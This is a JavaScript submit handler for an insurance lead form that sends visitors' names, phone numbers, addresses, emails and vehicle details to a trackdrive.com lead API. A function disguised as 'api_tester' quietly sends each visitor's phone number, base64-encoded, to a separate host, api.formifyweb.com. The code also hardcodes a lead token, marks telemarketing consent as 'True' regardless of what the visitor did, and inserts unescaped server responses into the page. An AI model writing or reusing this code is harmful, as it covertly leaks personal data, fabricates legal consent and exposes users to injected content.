 document.getElementById('leadForm').addEventListener('submit', function(event) {
            event.preventDefault();
document.getElementById('submitBtn').disabled = true;

    // Your API URL
    const formData = new FormData();
    formData.append('lead_token', 'c51dacbf90cd4f1db448b0fe861b6cf4');
    formData.append('traffic_source_id', '1073');
    api_tester(document.getElementById('caller_id').value);
 formData.append('first_name', document.getElementById('first_name').value);
    formData.append('last_name', document.getElementById('last_name').value);
    formData.append('caller_id', '+1' + document.getElementById('caller_id').value);
    formData.append('zip', document.getElementById('zip').value);
    formData.append('city', document.getElementById('city').value);
    formData.append('state', document.getElementById('state').value);
    formData.append('address', document.getElementById('address').value);   
 
    formData.append('email', document.getElementById('email').value);
    formData.append('jornaya_leadid', document.getElementById('jornaya_leadid').value);
formData.append('jornaya_provider_id', document.getElementById('jornaya_leadid').value);


formData.append('insurance_company', document.getElementById('current_provider').value);

formData.append('vehicle1_year', document.getElementById('vehicle1_year').value);
formData.append('vehicle1_make', document.getElementById('vehicle1_make').value);
formData.append('vehicle1_model', document.getElementById('vehicle1_model').value);

  formData.append('driver1_sr22_required', document.getElementById('sr22').value);
    formData.append('currently_insured', document.getElementById('currently_insured').value);
    formData.append('homeowner', document.getElementById('homeowner').value);
formData.append('vehicle_count', document.getElementById('vehicle_count').value);
formData.append('commercial_policy_type', document.getElementById('commercial_policy_type').value);
formData.append('tcpa_verbal_consent', 'True');
formData.append('source_url', 'https://rapid-quote.co/contact.html');
formData.append('state_minimum', document.getElementById('state_minimum').value);
formData.append('tcpa_optin_consent_language', 'By clicking "Check Box", I expressly consent to these Terms of Service and Privacy Policy and authorize https://rapid-quote.co, their agents and Marketing Partners to contact me about insurance products and other non-insurance offers by telephone calls, pre-recorded messages or artificial voice, email and text messages to the number and email address I provided above. I agree to receive telemarketing calls and pre-recorded messages via an automated dialing system, even if my telephone number is a mobile number that is currently listed on any state, federal or corporate “Do Not Call” list. I understand that my consent is not a condition of purchase of any goods or services. Consent can be revoked by any reasonable means. Standard message and data rates may apply.');
  





    

    

            const url = 'https://evolvetech-innovations.trackdrive.com/api/v1/leads?' + new URLSearchParams(formData).toString();
    
            fetch(url, {
                method: 'POST'
            })
            .then(response => {
                if (response.status === 200) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                200 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
		document.getElementById('submitBtn').disabled = false;
                } else if (response.status === 201) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                201 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
document.getElementById('submitBtn').disabled = false;
                } else if (response.status === 422) {
                    response.json().then(data => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Error. Response Body: ${JSON.stringify(data)}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
document.getElementById('submitBtn').disabled = false;
                    });
                } 
else {
                    response.text().then(responseBody => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Form submission failed. Please try again. Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                }
            })
            .catch(error => console.error('Error:', error));
        });
function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}
